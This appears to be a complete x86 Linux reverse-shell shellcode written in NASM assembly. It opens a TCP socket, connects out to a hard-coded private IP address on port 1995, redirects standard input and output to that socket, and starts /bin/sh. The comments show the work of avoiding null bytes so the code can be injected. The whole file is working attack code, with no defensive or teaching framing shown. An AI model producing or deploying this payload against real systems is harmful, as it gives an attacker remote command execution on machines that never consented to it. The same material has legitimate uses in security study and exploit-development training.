global _start
 
section .text
 
_start:
 
    ; zero out registers
    xor eax, eax 
    xor ebx, ebx
    xor edx, edx
    xor esi, esi


	;socke block

	push eax
	mov al, 0x66 ; socketcall 102, we use al instead of eax so we don’t end up with 0x00
	mov bl, 1 ;
	push byte 0x1 ;pushing 1 on the stack, this is to indicate that we will be using SOCK_STREAM
	push byte 0x2 ; 2 is AF_INET
	mov ecx, esp ; move the stackpointer into ecx
	int 0x80 ; syscall to create a socket file descriptor

	 ; connect block

	mov esi, eax
	mov al, 0x66
	pop ebx
	inc ebx
	pop edi ; sys_connect 3
	push 0x362BA8C0 ; push ip to stack
	push word 0xcb07 ; port 1995
	push word 0x2
	push byte 16
	push ecx
	push esi
	mov ecx, esp
    	int 0x80





	xchg esi, ebx
	xor ecx, ecx	   
	add cl, 0x2
	 
	dup:
	    mov al, 0x3f
	    int 0x80
	    dec cl
	    jns dup
 



	; execve block, spawining a shell 
	mov BYTE al, 11 ; execve ID
	push edx ; push null for null terminator
	push 0x68732f2f ; push "//sh" to the stack.
	push 0x6e69622f ; push "/bin" to the stack.
	mov ebx, esp ; store ESP pointer to "/bin//sh" in EBX
	push edx
	mov edx, esp
	push ebx
	mov ecx, esp
	int 0x80
 



